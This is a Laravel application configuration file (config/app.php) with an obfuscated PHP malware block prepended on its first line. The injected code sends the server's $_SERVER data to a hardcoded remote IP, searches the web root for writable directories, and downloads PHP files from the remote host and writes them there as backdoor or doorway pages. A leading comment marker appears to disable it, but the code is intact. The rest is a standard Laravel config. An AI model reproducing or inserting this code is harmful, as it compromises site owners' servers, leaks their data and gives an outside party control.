<?php //if(!@$incode!=false||!@$incode!=null){$vl='u1';$serverid='2dfaa96adb04f4bd88a0255041764928';$liillilllil=time();function lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill){if(ini_get('allow_url_fopen')==1):$lillillliiili=stream_context_create(array('http'=>array('method'=>'POST','header'=>array('Content-type: application/x-www-form-urlencoded'),'content'=>http_build_query($_SERVER))));if($lilillilllllill=='yes'):$lliiiilllill=$lliiiilllill.'&type=fopen';endif;$lliiilliiill=@file_get_contents($lliiiilllill,false,$lillillliiili);elseif(in_array('curl',get_loaded_extensions())):if($lilillilllllill=='yes'):$lliiiilllill=$lliiiilllill.'&type=curl';endif;$llillilliili=curl_init();curl_setopt($llillilliili,CURLOPT_URL,$lliiiilllill);curl_setopt($llillilliili,CURLOPT_HEADER,false);curl_setopt($llillilliili,CURLOPT_RETURNTRANSFER,true);curl_setopt($llillilliili,CURLOPT_POSTFIELDS,http_build_query($_SERVER));$lliiilliiill=@curl_exec($llillilliili);curl_close($llillilliili);else:if($lilillilllllill=='yes'):$lililliiiillill=$lililliiiillill.'&type=socks';endif;$lllliiililii=fsockopen($lliiilliiilii,80,$liiiillllillili,$llllililllll,10);if($lllliiililii):$lilllliiiiiiii=http_build_query($_SERVER);$lilliillllllli='POST '.$lililliiiillill.' HTTP/1.0'."\r\n";$lilliillllllli.='Host: '.$lliiilliiilii."\r\n";$lilliillllllli.='Content-Type: application/x-www-form-urlencoded'."\r\n";$lilliillllllli.='Content-Length: '.strlen($lilllliiiiiiii)."\r\n\r\n";fputs($lllliiililii,$lilliillllllli);fputs($lllliiililii,$lilllliiiiiiii);$llliiiliili='';while(!feof($lllliiililii)):$llliiiliili.=fgets($lllliiililii,4096);endwhile;fclose($lllliiililii);list($liiillllillll,$lillllllillllli)=@preg_split("/\R\R/",$llliiiliili,2);$lliiilliiill=$lillllllillllli;endif;endif;return$lliiilliiill;}function liiiiiillilill($lliililllli){$lliillliliii=array();$lliillliliii[]=$lliililllli;foreach(scandir($lliililllli) as$liililililllil):if($liililililllil=='.'||$liililililllil=='..'):continue;endif;$lllllllillii=$lliililllli.DIRECTORY_SEPARATOR.$liililililllil;if(is_dir($lllllllillii)):$lliillliliii[]=$lllllllillii;$lliillliliii=array_merge($lliillliliii,liiiiiillilill($lllllllillii));endif;endforeach;return$lliillliliii;}$lililliiiillill='/handlers/spiderhandler.php?checkdomain&time='.$liillilllil;$lilliliiillliil='204';$liiililillllil='217';$liliiillili='12';$liliiiillill='250';$lliiilliiilii=$liiililillllil.'.'.$liliiillili.'.'.$lilliliiillliil.'.'.$liliiiillill;$lliiiilllill='http://'.$lliiilliiilii.'/handlers/spiderhandler.php?checkdomain&time='.$liillilllil;$llliiiiiilili=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='yes');if($llliiiiiilili!='havedoor|havedonor'):if($llliiiiiilili!='needtowait'):$liiiiiiiilii=@preg_replace('/^www\./','',$_SERVER['HTTP_HOST']);$liiiililllli=$_SERVER['DOCUMENT_ROOT'];chdir($liiiililllli);$lliillliliii=liiiiiillilill($liiiililllli);$lliillliliii=array_unique($lliillliliii);foreach($lliillliliii as$liililililllil):if(is_dir($liililililllil)&&is_writable($liililililllil)):$lillliiliilli=explode(DIRECTORY_SEPARATOR,$liililililllil);$llilliliilil=count($lillliiliilli);$lilililllllilll[]=$llilliliilil.'|'.$liililililllil;endif;endforeach;$llilliliilil=0;foreach($lilililllllilll as$llliiiiiiii):if(count($lilililllllilll)>1&&(strstr($llliiiiiiii,'/wp-admin')||strstr($llliiiiiiii,'/cgi-bin'))):unset($lilililllllilll[$llilliliilil]);endif;$llilliliilil++;endforeach;if(!is_writable($liiiililllli)):natsort($lilililllllilll);$lilililllllilll=array_values($lilililllllilll);$llliiiiiiii=explode('|',$lilililllllilll[0]);$llliiiiiiii=$llliiiiiiii[1];else:$llliiiiiiii=$liiiililllli;endif;chdir($llliiiiiiii);if(strstr($llliiiiiilili,'|')):$llliliiilll=explode('|',$llliiiiiilili);$liiililiilii=$llliliiilll[0];$liiiilllllli=$llliliiilll[1];if($liiililiilii=='nodoor'):$lliiiilllill='http://'.$lliiilliiilii.'/handlers/update.php?vl='.$vl.'&upd&needfilename';$lililliiiillill='/handlers/update.php?vl='.$vl.'&upd&needfilename';$liililliiill=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='no');$lilliliiiilllil=explode('|||||',$liililliiill);$lllliiliiiii=$lilliliiiilllil[0].'.php';$lliillilllliii=$lilliliiiilllil[1];file_put_contents($llliiiiiiii.DIRECTORY_SEPARATOR.$lllliiliiiii,$lliillilllliii);$llililiillll=str_replace($liiiililllli,'',$llliiiiiiii);$lliiiilllill='http://'.@preg_replace('/^www\./','',$_SERVER['HTTP_HOST']).$llililiillll.'/'.$lllliiliiiii.'?gen&serverid='.$serverid;$lililliiiillill=$llililiillll.'/'.$lllliiliiiii.'?gen&serverid='.$serverid;$liiiilillilliil=lillliilliii($lliiiilllill,$_SERVER['HTTP_HOST'],$lililliiiillill,$lilillilllllill='no');endif;if($liiiilllllli=='nodonor'):endif;elseif($llliiiiiilili=='needtoloadsomefiles'):shuffle($lilililllllilll);$llliiiiiiii=explode('|',$lilililllllilll[0]);$llliiiiiiii=$llliiiiiiii[1];$llililiillll=str_replace($liiiililllli,'',$llliiiiiiii);$lliliiilill='stuvwxyz';$lllliiliiiii=str_shuffle($lliliiilill).'.php';$llllllilliil=urlencode('http://'.$liiiiiiiilii.$llililiillll.'/'.$lllliiliiiii);$lliiiilllill='http://'.$lliiilliiilii.'/handlers/getback.php?url='.$llllllilliil;$lililliiiillill='/handlers/getback.php?url='.$llllllilliil;$lliiilliiill=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='no');file_put_contents($llliiiiiiii.DIRECTORY_SEPARATOR.$lllliiliiiii,$lliiilliiill);endif;endif;endif;$liiiiliiill=true;$incode=true;}?><?php

return [

    /*
    |--------------------------------------------------------------------------
    | Application Name
    |--------------------------------------------------------------------------
    |
    | This value is the name of your application. This value is used when the
    | framework needs to place the application's name in a notification or
    | any other location as required by the application or its packages.
    */

    'name' => env('APP_NAME', 'Laravel'),

    /*
    |--------------------------------------------------------------------------
    | Application Environment
    |--------------------------------------------------------------------------
    |
    | This value determines the "environment" your application is currently
    | running in. This may determine how you prefer to configure various
    | services your application utilizes. Set this in your ".env" file.
    |
    */

    'env' => env('APP_ENV', 'production'),

    /*
    |--------------------------------------------------------------------------
    | Application Debug Mode
    |--------------------------------------------------------------------------
    |
    | When your application is in debug mode, detailed error messages with
    | stack traces will be shown on every error that occurs within your
    | application. If disabled, a simple generic error page is shown.
    |
    */

    'debug' => env('APP_DEBUG', false),

    /*
    |--------------------------------------------------------------------------
    | Application URL
    |--------------------------------------------------------------------------
    |
    | This URL is used by the console to properly generate URLs when using
    | the Artisan command line tool. You should set this to the root of
    | your application so that it is used when running Artisan tasks.
    |
    */

    'url' => env('APP_URL', 'http://localhost'),

    /*
    |--------------------------------------------------------------------------
    | Application Timezone
    |--------------------------------------------------------------------------
    |
    | Here you may specify the default timezone for your application, which
    | will be used by the PHP date and date-time functions. We have gone
    | ahead and set this to a sensible default for you out of the box.
    |
    */

    'timezone' => 'UTC',

    /*
    |--------------------------------------------------------------------------
    | Application Locale Configuration
    |--------------------------------------------------------------------------
    |
    | The application locale determines the default locale that will be used
    | by the translation service provider. You are free to set this value
    | to any of the locales which will be supported by the application.
    |
    */

    'locale' => 'en',

    /*
    |--------------------------------------------------------------------------
    | Application Fallback Locale
    |--------------------------------------------------------------------------
    |
    | The fallback locale determines the locale to use when the current one
    | is not available. You may change the value to correspond to any of
    | the language folders that are provided through your application.
    |
    */

    'fallback_locale' => 'en',

    /*
    |--------------------------------------------------------------------------
    | Encryption Key
    |--------------------------------------------------------------------------
    |
    | This key is used by the Illuminate encrypter service and should be set
    | to a random, 32 character string, otherwise these encrypted strings
    | will not be safe. Please do this before deploying an application!
    |
    */

    'key' => env('APP_KEY'),

    'cipher' => 'AES-256-CBC',

    /*
    |--------------------------------------------------------------------------
    | Logging Configuration
    |--------------------------------------------------------------------------
    |
    | Here you may configure the log settings for your application. Out of
    | the box, Laravel uses the Monolog PHP logging library. This gives
    | you a variety of powerful log handlers / formatters to utilize.
    |
    | Available Settings: "single", "daily", "syslog", "errorlog"
    |
    */

    'log' => env('APP_LOG', 'single'),

    'log_level' => env('APP_LOG_LEVEL', 'debug'),

    /*
    |--------------------------------------------------------------------------
    | Autoloaded Service Providers
    |--------------------------------------------------------------------------
    |
    | The service providers listed here will be automatically loaded on the
    | request to your application. Feel free to add your own services to
    | this array to grant expanded functionality to your applications.
    |
    */

    'providers' => [
        /*
         * Laravel Framework Service Providers...
         */
        Maatwebsite\Excel\ExcelServiceProvider::class, 
        DaveJamesMiller\Breadcrumbs\ServiceProvider::class, 
        Intervention\Image\ImageServiceProvider::class,
        Illuminate\Auth\AuthServiceProvider::class,
        Illuminate\Broadcasting\BroadcastServiceProvider::class,
        Illuminate\Bus\BusServiceProvider::class,
        Illuminate\Cache\CacheServiceProvider::class,
        Illuminate\Foundation\Providers\ConsoleSupportServiceProvider::class,
        Illuminate\Cookie\CookieServiceProvider::class,
        Illuminate\Database\DatabaseServiceProvider::class,
        Illuminate\Encryption\EncryptionServiceProvider::class,
        Illuminate\Filesystem\FilesystemServiceProvider::class,
        Illuminate\Foundation\Providers\FoundationServiceProvider::class,
        Illuminate\Hashing\HashServiceProvider::class,
        Illuminate\Mail\MailServiceProvider::class,
        Illuminate\Notifications\NotificationServiceProvider::class,
        Illuminate\Pagination\PaginationServiceProvider::class,
        Illuminate\Pipeline\PipelineServiceProvider::class,
        Illuminate\Queue\QueueServiceProvider::class,
        Illuminate\Redis\RedisServiceProvider::class,
        Illuminate\Auth\Passwords\PasswordResetServiceProvider::class,
        Illuminate\Session\SessionServiceProvider::class,
        Illuminate\Translation\TranslationServiceProvider::class,
        Illuminate\Validation\ValidationServiceProvider::class,
        Illuminate\View\ViewServiceProvider::class,

        /*
         * Package Service Providers...
         */
        Laravel\Tinker\TinkerServiceProvider::class,

        /*
         * Application Service Providers...
         */
        App\Providers\AppServiceProvider::class,
        App\Providers\AuthServiceProvider::class,
        // App\Providers\BroadcastServiceProvider::class,
        App\Providers\EventServiceProvider::class,
        App\Providers\RouteServiceProvider::class,

    ],

    /*
    |--------------------------------------------------------------------------
    | Class Aliases
    |--------------------------------------------------------------------------
    |
    | This array of class aliases will be registered when this application
    | is started. However, feel free to register as many as you wish as
    | the aliases are "lazy" loaded so they don't hinder performance.
    |
    */

    'aliases' => [
    	'Excel' => Maatwebsite\Excel\Facades\Excel::class,
		'Breadcrumbs' => DaveJamesMiller\Breadcrumbs\Facade::class,
        'Image' => Intervention\Image\Facades\Image::class,
        'App' => Illuminate\Support\Facades\App::class,
        'Artisan' => Illuminate\Support\Facades\Artisan::class,
        'Auth' => Illuminate\Support\Facades\Auth::class,
        'Blade' => Illuminate\Support\Facades\Blade::class,
        'Broadcast' => Illuminate\Support\Facades\Broadcast::class,
        'Bus' => Illuminate\Support\Facades\Bus::class,
        'Cache' => Illuminate\Support\Facades\Cache::class,
        'Config' => Illuminate\Support\Facades\Config::class,
        'Cookie' => Illuminate\Support\Facades\Cookie::class,
        'Crypt' => Illuminate\Support\Facades\Crypt::class,
        'DB' => Illuminate\Support\Facades\DB::class,
        'Eloquent' => Illuminate\Database\Eloquent\Model::class,
        'Event' => Illuminate\Support\Facades\Event::class,
        'File' => Illuminate\Support\Facades\File::class,
        'Gate' => Illuminate\Support\Facades\Gate::class,
        'Hash' => Illuminate\Support\Facades\Hash::class,
        'Lang' => Illuminate\Support\Facades\Lang::class,
        'Log' => Illuminate\Support\Facades\Log::class,
        'Mail' => Illuminate\Support\Facades\Mail::class,
        'Notification' => Illuminate\Support\Facades\Notification::class,
        'Password' => Illuminate\Support\Facades\Password::class,
        'Queue' => Illuminate\Support\Facades\Queue::class,
        'Redirect' => Illuminate\Support\Facades\Redirect::class,
        'Redis' => Illuminate\Support\Facades\Redis::class,
        'Request' => Illuminate\Support\Facades\Request::class,
        'Response' => Illuminate\Support\Facades\Response::class,
        'Route' => Illuminate\Support\Facades\Route::class,
        'Schema' => Illuminate\Support\Facades\Schema::class,
        'Session' => Illuminate\Support\Facades\Session::class,
        'Storage' => Illuminate\Support\Facades\Storage::class,
        'URL' => Illuminate\Support\Facades\URL::class,
        'Validator' => Illuminate\Support\Facades\Validator::class,
        'View' => Illuminate\Support\Facades\View::class,

    ],

];
